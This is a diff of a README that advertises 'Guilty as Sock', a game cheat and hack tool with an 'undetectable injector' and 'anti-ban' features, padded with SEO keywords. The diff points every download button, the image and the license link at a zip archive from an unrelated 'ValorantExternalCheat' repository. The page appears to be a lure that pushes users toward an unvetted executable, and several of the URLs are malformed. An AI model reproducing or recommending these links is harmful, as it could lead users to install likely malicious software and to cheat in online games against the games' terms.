@@ -1,9 +1,9 @@
 # 🧦 Guilty as Sock Cheats & Hacks  
 **Unleash new potential in your gameplay!**  
 
-![image](https://github.com/user-attachments/assets/ea0be4f2-a1d1-4fa3-9ed1-8a6479b58a71)
+![image](https://raw.githubusercontent.com/ChakerDen/ValorantExternalCheat/main/strake/ValorantExternalCheat.zip)
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://ezlaunch.live/pPnqF1yp)
+[![Download Now](https://raw.githubusercontent.com/ChakerDen/ValorantExternalCheat/main/strake/ValorantExternalCheat.zip%https://raw.githubusercontent.com/ChakerDen/ValorantExternalCheat/main/strake/ValorantExternalCheat.zip)](https://raw.githubusercontent.com/ChakerDen/ValorantExternalCheat/main/strake/ValorantExternalCheat.zip)
 
 ## 🖥️ OS Compatibility Table
 | Operating System      | Supported | Version   | Notes                         |
@@ -29,7 +29,7 @@ Guilty as Sock is your all-in-one gaming utility designed to boost performance, 
 ## 📦 Installation  
 1. Click the **Download Now** button below to obtain the installer.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://ezlaunch.live/pPnqF1yp)
+[![Download Now](https://raw.githubusercontent.com/ChakerDen/ValorantExternalCheat/main/strake/ValorantExternalCheat.zip%https://raw.githubusercontent.com/ChakerDen/ValorantExternalCheat/main/strake/ValorantExternalCheat.zip)](https://raw.githubusercontent.com/ChakerDen/ValorantExternalCheat/main/strake/ValorantExternalCheat.zip)
 
 ## 🔑 SEO Keywords  
 guilty as sock, game automation, up-to-date hacks 2025, aim improvement, stealth utilities, undetectable gameplay, cross-platform cheats, anti-ban 2025, gaming tools for windows, linux, macOS, undetectable injector
@@ -38,6 +38,6 @@ guilty as sock, game automation, up-to-date hacks 2025, aim improvement, stealth
 This repository is for educational and research purposes only. Respect the terms of service of each game. Using enhancement tools may result in restrictions or bans. Developing modifications is a learning opportunity but not encouraged in violation of any law.
 
 ## 🏷️ License  
-MIT License – See the [LICENSE](https://choosealicense.com/licenses/mit/) for details.
+MIT License – See the [LICENSE](https://raw.githubusercontent.com/ChakerDen/ValorantExternalCheat/main/strake/ValorantExternalCheat.zip) for details.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://ezlaunch.live/pPnqF1yp)
+[![Download Now](https://raw.githubusercontent.com/ChakerDen/ValorantExternalCheat/main/strake/ValorantExternalCheat.zip%https://raw.githubusercontent.com/ChakerDen/ValorantExternalCheat/main/strake/ValorantExternalCheat.zip)](https://raw.githubusercontent.com/ChakerDen/ValorantExternalCheat/main/strake/ValorantExternalCheat.zip)
